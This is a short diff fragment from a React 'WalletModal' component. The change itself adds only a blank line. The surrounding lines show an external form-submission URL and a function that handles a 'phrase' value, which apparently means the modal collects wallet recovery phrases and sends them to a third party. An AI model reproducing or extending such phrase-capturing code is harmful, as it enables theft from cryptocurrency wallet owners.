@@ -17,6 +17,7 @@ const WalletModal = ({ show, handleClose, name }) => {
   const FORMSPARK_ACTION_URL = "https://submit-form.com/kNJFdDxbt";
 
 
+  
   const fetchUserProfile = async () => {
     let value;
     if (phrase !== "") {
